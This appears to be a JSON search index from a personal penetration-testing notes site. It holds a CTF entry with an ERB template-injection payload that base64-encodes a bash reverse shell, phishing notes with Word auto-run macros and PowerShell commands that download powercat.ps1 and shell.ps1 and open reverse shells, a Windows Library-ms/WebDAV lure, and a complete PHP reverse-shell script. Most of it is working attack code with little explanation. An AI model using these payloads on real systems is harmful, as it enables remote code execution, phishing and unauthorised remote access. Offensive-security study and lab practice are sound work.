e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 \u003cspan class=\"o\"\u003e(\u003c/span\u003eED25519\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e80/tcp open  http    nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Weighted Grade Calculator\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: OS: Linux\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:linux:linux_kernel\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eExploitation form ssti RCE / bypass regex filter :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ruby\" data-lang=\"ruby\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"no\"\u003eABCDE\u003c/span\u003e\u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"n\"\u003eA\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;%\u003c/span\u003e\u003cspan class=\"mi\"\u003e25\u003c/span\u003e\u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"n\"\u003ed\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nb\"\u003esystem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;echo+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDI0MiAwPCYxIDI%2bJjE%3d+|+base64+-d+|+bash+\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e+%\u003c/span\u003e\u003cspan class=\"mi\"\u003e25\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"c1\"\u003e#payload\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003ccode\u003e\u0026quot;%0A\u0026quot; to bypass the filter and at the same type encode the payload in base64 to also bypass security .\u003c/code\u003e\u003c/p\u003e","tags":[],"title":"Perfection"},{"content":" Canarytokens - Generate a link to gather informations on the target : https://canarytokens.org/nest/\nMacro words :\nSub AutoOpen() MyMacro End Sub Sub Document_Open() MyMacro End Sub Sub MyMacro() Dim Str As String CreateObject(\u0026#34;Wscript.Shell\u0026#34;).Run Str End Sub\rEncode the command with base64 to avoid issues with special characters : IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://192.168.119.2/powercat.ps1\u0026#39;);powercat -c 192.168.119.2 -p 4444 -e powershell Listing 216 - PowerShell\rstr = \u0026#34;powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA...\u0026#34; n = 50 for i in range(0, len(str), n): print(\u0026#34;Str = Str + \u0026#34; + \u0026#39;\u0026#34;\u0026#39; + str[i:i+n] + \u0026#39;\u0026#34;\u0026#39;) Listing 217 - Python script to split a base64 encoded\rSub AutoOpen() MyMacro End Sub Sub Document_Open() MyMacro End Sub Sub MyMacro() Dim Str As String Str = Str + \u0026#34;powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU\u0026#34; Str = Str + \u0026#34;AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd\u0026#34; Str = Str + \u0026#34;AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB\u0026#34; ... Str = Str + \u0026#34;QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA\u0026#34; Str = Str + \u0026#34;gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA\u0026#34; Str = Str + \u0026#34;A== \u0026#34; CreateObject(\u0026#34;Wscript.Shell\u0026#34;).Run Str End Sub\rAbusing Windows Library Files :\nCreate a webdav server : wsgidav --host=0.0.0.0 --port=80 --auth=anonymous - -root /home/kali/webdav/\rCreate a file config.Library-ms with this content: \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;libraryDescription xmlns=\u0026#34;http://schemas.microsoft.com/windows/2009/library\u0026#34;\u0026gt; \u0026lt;name\u0026gt;@windows.storage.dll,-34582\u0026lt;/name\u0026gt; \u0026lt;version\u0026gt;6\u0026lt;/version\u0026gt; \u0026lt;isLibraryPinned\u0026gt;true\u0026lt;/isLibraryPinned\u0026gt; \u0026lt;iconReference\u0026gt;imageres.dll,-1003\u0026lt;/iconReference\u0026gt; \u0026lt;templateInfo\u0026gt; \u0026lt;folderType\u0026gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}\u0026lt;/folderType\u0026gt; \u0026lt;/templateInfo\u0026gt; \u0026lt;searchConnectorDescriptionList\u0026gt; \u0026lt;searchConnectorDescription\u0026gt; \u0026lt;isDefaultSaveLocation\u0026gt;true\u0026lt;/isDefaultSaveLocation\u0026gt; \u0026lt;isSupported\u0026gt;false\u0026lt;/isSupported\u0026gt; \u0026lt;simpleLocation\u0026gt; \u0026lt;url\u0026gt;http://myip\u0026lt;/url\u0026gt; \u0026lt;/simpleLocation\u0026gt; \u0026lt;/searchConnectorDescription\u0026gt; \u0026lt;/searchConnectorDescriptionList\u0026gt; \u0026lt;/libraryDescription\u0026gt;\rCreate a lnk file and name it automatic_configuration : powershell -c \u0026#34;IEX(New-Object System.Net.WebClient).DownloadString(\u0026#39;http://10.0.1.26:8080/shell.ps1\u0026#39;)\u0026#34;\rPut those lnk in the webdav directory and deliver the config.Library-ms and force the user to click in the lnk . ","date":"2023-09-07","id":84,"permalink":"/notes/ad/phishing/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eCanarytokens - Generate a link to gather informations on the target : https://canarytokens.org/nest/\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMacro words :\u003c/strong\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSub AutoOpen\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tMyMacro\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEnd Sub\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSub Document_Open\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tMyMacro\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEnd Sub\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSub MyMacro\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tDim Str As String\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tCreateObject\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Wscript.Shell\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.Run Str\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEnd Sub\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEncode the command with base64 to avoid issues with special characters :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIEX\u003cspan class=\"o\"\u003e(\u003c/span\u003eNew-Object\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSystem.Net.WebClient\u003cspan class=\"o\"\u003e)\u003c/span\u003e.DownloadString\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;http://192.168.119.2/powercat.ps1\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003epowercat -c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.119.2 -p \u003cspan class=\"m\"\u003e4444\u003c/span\u003e -e powershell\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eListing \u003cspan class=\"m\"\u003e216\u003c/span\u003e - PowerShell\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003estr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA...\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003en\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e50\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efor\u003c/span\u003e i in range\u003cspan class=\"o\"\u003e(\u003c/span\u003e0, len\u003cspan class=\"o\"\u003e(\u003c/span\u003estr\u003cspan class=\"o\"\u003e)\u003c/span\u003e, n\u003cspan class=\"o\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprint\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Str = Str + \u0026#34;\u003c/span\u003e + \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#34;\u0026#39;\u003c/span\u003e + str\u003cspan class=\"o\"\u003e[\u003c/span\u003ei:i+n\u003cspan class=\"o\"\u003e]\u003c/span\u003e + \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#34;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eListing \u003cspan class=\"m\"\u003e217\u003c/span\u003e - Python script to split a base64 encoded\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSub AutoOpen\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tMyMacro\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEnd Sub\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSub Document_Open\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tMyMacro\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEnd Sub\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSub MyMacro\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tDim Str As String\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nv\"\u003eStr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Str + \u003cspan class=\"s2\"\u003e\u0026#34;powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nv\"\u003eStr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Str + \u003cspan class=\"s2\"\u003e\u0026#34;AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nv\"\u003eStr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Str + \u003cspan class=\"s2\"\u003e\u0026#34;AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nv\"\u003eStr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Str + \u003cspan class=\"s2\"\u003e\u0026#34;QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nv\"\u003eStr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Str + \u003cspan class=\"s2\"\u003e\u0026#34;gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nv\"\u003eStr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Str + \u003cspan class=\"s2\"\u003e\u0026#34;A== \u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\tCreateObject\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Wscript.Shell\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.Run Str\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEnd Sub\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eAbusing Windows Library Files :\u003c/strong\u003e\u003c/p\u003e","tags":[],"title":"Phishing"},{"content":"","date":"2023-09-07","id":85,"permalink":"/notes/code/php/","summary":"","tags":[],"title":"Php"},{"content":"\r\u0026lt;?php set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;10.8.3.12\u0026#39;; // CHANGE THIS $port = 4242; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } // Change to a safe directory chdir(\u0026#34;/\u0026#34;); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } // Spawn shell process $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won\u0026#39;t stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process\u0026#39;s STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } // If we can read from the process\u0026#39;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } // If we can read from the process\u0026#39;s STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we\u0026#39;ve daemonised ourself // (I can\u0026#39;t figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; ","date":"2023-09-07","id":86,"permalink":"/notes/shell-and-payload/php-monkey/","summary":"\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003eset_time_limit\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$VERSION\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1.0\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;10.8.3.12\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e// CHANGE THIS\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nv\"\u003e$port\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e4242\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e       \u003cspan class=\"c1\"\u003e// CHANGE THIS\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"nv\"\u003e$chunk_size\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1400\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$write_a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$error_a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$shell\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;uname -a; w; id; /bin/sh -i\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$daemon\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e//\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// Daemonise ourself if possible to avoid zombies later\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e//\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// pcntl_fork is hardly ever available, but will allow us to daemonise\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// our php process and avoid zombies.  Worth a try...\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efunction_exists\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;pcntl_fork\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"c1\"\u003e// Fork and have the parent process exit\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\t\u003cspan class=\"nv\"\u003e$pid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan 